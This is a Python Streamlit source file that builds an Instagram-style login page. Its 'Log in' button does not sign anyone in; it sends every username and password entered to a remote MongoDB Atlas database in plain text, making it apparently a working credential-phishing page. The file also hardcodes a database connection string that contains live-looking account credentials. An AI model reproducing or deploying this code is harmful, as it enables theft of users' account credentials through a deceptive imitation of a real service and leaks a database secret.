import streamlit as st
from pymongo import MongoClient

# MongoDB Atlas connection string
connection_string = "mongodb+srv://maheshsaimullapudi39:Jagan17@cluster0.2q4lcww.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

# Establish connection to MongoDB
client = MongoClient(connection_string)

# Access the 'user_data' database
db = client['user_data']
users_collection = db['users']

# Function to store the username and password
def store_user(username, password):
    new_user = {
        "username": username,
        "password": password  # Storing password as plain text
    }
    users_collection.insert_one(new_user)
    st.success(f"User {username} and password stored successfully!")

# Streamlit UI with HTML and CSS
def main():
    # Set page title and icon
    st.set_page_config(page_title="Login Page", page_icon="🔑", layout="centered")

    # Custom CSS (you provided)
    st.markdown("""
    <style>
        * {
            margin: 0px;
            padding: 0px;
        }

        body {
            background-color: #eee;
        }

        #wrapper {
            width: 500px;
            height: 50%;
            overflow: hidden;
            border: 0px solid #000;
            margin: 50px auto;
            padding: 10px;
        }

        .main-content {
            width: 250px;
            height: 40%;
            margin: 10px auto;
            background-color: #fff;
            border: 2px solid #e6e6e6;
            padding: 40px 50px;
        }

        .header {
            border: 0px solid #000;
            margin-bottom: 5px;
        }

        .header img {
            height: 50px;
            width: 175px;
            margin: auto;
            position: relative;
            left: 40px;
        }

        .input-1,
        .input-2 {
            width: 100%;
            margin-bottom: 5px;
            padding: 8px 12px;
            border: 1px solid #dbdbdb;
            box-sizing: border-box;
            border-radius: 3px;
        }

        .overlap-text {
            position: relative;
        }

        .overlap-text a {
            position: absolute;
            top: 8px;
            right: 10px;
            color: #003569;
            font-size: 14px;
            text-decoration: none;
            font-family: 'Overpass Mono', monospace;
            letter-spacing: -1px;
        }

        .btn {
            width: 100%;
            background-color: #3897f0;
            border: 1px solid #3897f0;
            padding: 5px 12px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            border-radius: 3px;
        }

        .sub-content {
            width: 250px;
            height: 40%;
            margin: 10px auto;
            border: 1px solid #e6e6e6;
            padding: 20px 50px;
            background-color: #fff;
        }

        .s-part {
            text-align: center;
            font-family: 'Overpass Mono', monospace;
            word-spacing: -3px;
            letter-spacing: -2px;
            font-weight: normal;
        }

        .s-part a {
            text-decoration: none;
            cursor: pointer;
            color: #3897f0;
            font-family: 'Overpass Mono', monospace;
            word-spacing: -3px;
            letter-spacing: -2px;
            font-weight: normal;
        }

        input:focus {
            background-color: yellow;
        }

        .youtube {
            position: fixed;
            bottom: 10px;
            right: 10px;
            width: 160px;
            text-align: center;
            padding: 15px 10px;
            background: #bb0000;
            border-radius: 5px;
        }

        .youtube a {
            text-decoration: none;
            color: #fff;
            text-transform: capitalize;
            letter-spacing: 1px;
        }
    </style>
    """, unsafe_allow_html=True)

    # Wrapper for the content
    with st.container():
        st.markdown('<div id="wrapper">', unsafe_allow_html=True)

        # Header
        st.markdown('<div class="header"><img src="https://i.imgur.com/zqpwkLQ.png" /></div>', unsafe_allow_html=True)

        # Login Form
        st.markdown('<div class="main-content">', unsafe_allow_html=True)

        # Username and password inputs
        username = st.text_input("Username", "", key="username", placeholder="Enter your username", label_visibility="collapsed")
        password = st.text_input("Password", "", type="password", key="password", placeholder="Enter your password", label_visibility="collapsed")

        # Remember me or forgot password
        st.markdown('<div class="overlap-text"><a href="#">Forgot?</a></div>', unsafe_allow_html=True)

        # Login Button
        if st.button("Log in"):
            if username and password:
                # Store the username and password in MongoDB
                store_user(username, password)
            else:
                st.warning("Please enter both username and password")

        st.markdown('</div>', unsafe_allow_html=True)  # Close main content div

        # Signup Section (Just like Instagram)
        st.markdown('<div class="sub-content">', unsafe_allow_html=True)
        st.markdown('<div class="s-part">Don\'t have an account? <a href="#">Sign up</a></div>', unsafe_allow_html=True)
        st.markdown('</div>', unsafe_allow_html=True)  # Close sub-content div

        st.markdown('</div>', unsafe_allow_html=True)  # Close wrapper div

# Run the app
if __name__ == "__main__":
    main()
